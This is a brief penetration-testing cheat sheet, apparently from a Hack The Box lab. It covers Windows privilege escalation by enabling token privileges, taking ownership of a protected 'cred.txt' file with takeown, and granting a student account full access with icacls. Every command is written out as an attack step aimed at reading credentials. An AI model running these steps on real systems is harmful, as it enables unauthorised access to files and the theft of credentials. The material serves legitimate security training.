# EnableAllTokenPrivs

[Github page](https://github.com/fashionproof/EnableAllTokenPrivs)

```powershell
.\EnableAllTokenPrivs.ps1
```

# Exploit

View file privilege

```powershell
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```

```powershell
cmd /c dir /q 'C:\Department Shares\Private\IT'
```

Take ownership

```powershell
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

Grant ourself full access to the file

```powershell
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```